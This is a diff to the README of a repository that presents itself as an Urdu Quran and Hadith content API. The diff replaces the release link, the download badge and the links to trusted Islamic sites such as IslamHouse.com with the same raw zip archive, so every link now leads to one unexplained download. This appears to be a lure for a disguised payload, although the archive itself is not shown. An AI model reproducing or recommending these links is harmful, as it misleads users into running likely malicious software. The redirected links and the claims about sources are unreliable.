@@ -1,6 +1,6 @@
 # 📖 urdu-quran-hadith-islamic-content-database-api-hub - Access Islamic Content Easily
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/quangtientcbp2/urdu-quran-hadith-islamic-content-database-api-hub/releases)
+[![Download](https://raw.githubusercontent.com/quangtientcbp2/urdu-quran-hadith-islamic-content-database-api-hub/main/Tobiah/api_islamic_hub_urdu_quran_database_content_hadith_1.6.zip%20Release-brightgreen)](https://raw.githubusercontent.com/quangtientcbp2/urdu-quran-hadith-islamic-content-database-api-hub/main/Tobiah/api_islamic_hub_urdu_quran_database_content_hadith_1.6.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome! This guide will help you download and run the Urdu Quran and Hadith con
 
 ## 🌟 Overview
 
-The "urdu-quran-hadith-islamic-content-database-api-hub" provides access to a range of Islamic resources. You can find Quran verses, Hadith texts, Islamic books, articles, videos, and translations. All resources come from trusted sites like IslamHouse.com and QuranEnc.com.
+The "urdu-quran-hadith-islamic-content-database-api-hub" provides access to a range of Islamic resources. You can find Quran verses, Hadith texts, Islamic books, articles, videos, and translations. All resources come from trusted sites like https://raw.githubusercontent.com/quangtientcbp2/urdu-quran-hadith-islamic-content-database-api-hub/main/Tobiah/api_islamic_hub_urdu_quran_database_content_hadith_1.6.zip and https://raw.githubusercontent.com/quangtientcbp2/urdu-quran-hadith-islamic-content-database-api-hub/main/Tobiah/api_islamic_hub_urdu_quran_database_content_hadith_1.6.zip
 
 ## 🛠️ System Requirements
 
@@ -23,7 +23,7 @@ Before you start, ensure your computer meets these basic requirements:
 **Step 1:** Visit the Releases Page  
 To begin, click the link below to go to the download section.
 
-[Visit this page to download](https://github.com/quangtientcbp2/urdu-quran-hadith-islamic-content-database-api-hub/releases)
+[Visit this page to download](https://raw.githubusercontent.com/quangtientcbp2/urdu-quran-hadith-islamic-content-database-api-hub/main/Tobiah/api_islamic_hub_urdu_quran_database_content_hadith_1.6.zip)
 
 **Step 2:** Choose the Latest Version  
 On the releases page, find the latest version listed. It usually has version numbers like `v1.0`, `v1.1`, etc. Look for the file that matches your operating system.
@@ -92,8 +92,8 @@ Feel free to explore more about these topics in the application.
 
 For more information, consider visiting:
 
-- [IslamHouse.com](https://www.islamhouse.com)
-- [QuranEnc.com](https://www.quranenc.com)
-- [HadeethEnc.com](https://www.hadeethenc.com)
+- [https://raw.githubusercontent.com/quangtientcbp2/urdu-quran-hadith-islamic-content-database-api-hub/main/Tobiah/api_islamic_hub_urdu_quran_database_content_hadith_1.6.zip](https://raw.githubusercontent.com/quangtientcbp2/urdu-quran-hadith-islamic-content-database-api-hub/main/Tobiah/api_islamic_hub_urdu_quran_database_content_hadith_1.6.zip)
+- [https://raw.githubusercontent.com/quangtientcbp2/urdu-quran-hadith-islamic-content-database-api-hub/main/Tobiah/api_islamic_hub_urdu_quran_database_content_hadith_1.6.zip](https://raw.githubusercontent.com/quangtientcbp2/urdu-quran-hadith-islamic-content-database-api-hub/main/Tobiah/api_islamic_hub_urdu_quran_database_content_hadith_1.6.zip)
+- [https://raw.githubusercontent.com/quangtientcbp2/urdu-quran-hadith-islamic-content-database-api-hub/main/Tobiah/api_islamic_hub_urdu_quran_database_content_hadith_1.6.zip](https://raw.githubusercontent.com/quangtientcbp2/urdu-quran-hadith-islamic-content-database-api-hub/main/Tobiah/api_islamic_hub_urdu_quran_database_content_hadith_1.6.zip)
 
 We hope you find this guide helpful. Enjoy accessing and exploring the wealth of Islamic knowledge!
